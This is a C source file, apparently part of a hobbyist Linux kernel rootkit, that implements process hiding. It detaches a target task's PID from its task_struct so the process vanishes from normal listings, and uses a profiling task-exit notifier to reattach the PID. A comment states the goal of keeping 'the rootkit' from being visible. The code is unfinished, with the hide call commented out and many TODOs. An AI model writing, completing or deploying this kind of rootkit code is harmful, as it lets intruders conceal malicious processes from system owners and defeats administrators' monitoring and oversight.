#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>
#include <linux/profile.h>

#include "messagesToUser.h"
#include "processHider.h"
#include "processHiderPidManipulation.h"

#ifndef CONFIG_PROFILING
	#error "this module requires config profiling enabled"
#endif

//todo: prevent hiding processes that are already hidden..  test this..


//todo: group these to allow hiding multiple tasks..
struct restorableHiddenTask {
	void *task;
	struct pid *originalPid;
};

struct restorableHiddenTask onlyHiddenTask = {NULL};

// Function Prototyps
static int hideProcess(int pidNumber);
static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid);
static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
static int isTaskHidden(void *task);
//



struct notifier_block notificationOnProcessExit = {
	.notifier_call = notificationFunctionOnTaskExit,
	.next = NULL,// TODO: CHECK THIS
	.priority = 1, // TODO: CHECK THIS
};

//TODO: move this higher in the file
int processHider_init(void) {
	//TODO: only hide proccess when wanted ...
	//hideProcess(16441); // todo: perhaps use result of function call..
	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues

	//replacement_do_exit(0);

	//TODO: check value returned..

	// this will fail if profiling is disabled
	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
	if (error != 0) { //todo : extract function..
		return error;
	}

	return 0;
}


void processHider_exit(void) {
	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
		// alternatively kill them / require that the tasks are dead first..

	//TODO: ensure code is not in notifier when exit is progress / going to be called..
	int error;
	error = profile_event_unregister(PROFILE_TASK_EXIT, &notificationOnProcessExit);
}

//returns error code...
//PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
static int hideProcess(int pidNumber) {
	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
	if (pid == NULL) {
		return 1;
	}
	
	rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
	
	if (onlyHiddenTask.task != NULL) {
		printInfo("warning another task was already hidden - this is not supported properly yet\n");
	}

	onlyHiddenTask = hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(pid);
	
	rcu_read_unlock();
	
	return 0;
}


static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid) {
	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
	struct pid *originalPid;

	if (task != NULL) {
		originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
	} else {
		originalPid = NULL;
	}
	struct restorableHiddenTask result = {
			.task = task,
			.originalPid = originalPid,
	};

	return result;
}

static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
	//printInfo("in notification function for exit - task is %p\n", task);
	if (isTaskHidden(task)) {
		//TODO: add support for hiding multiple tasks / get restorable task struct that corresponds to pid..

		struct restorableHiddenTask taskToRestore = onlyHiddenTask;
		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h

		attach_pid(task, PIDTYPE_PID, taskToRestore.originalPid);

		rcu_read_unlock();

		onlyHiddenTask.task = NULL; //mark as no longer hidden
	}


	return 0;
}

static int isTaskHidden(void *task) {
	return (task == onlyHiddenTask.task);
}

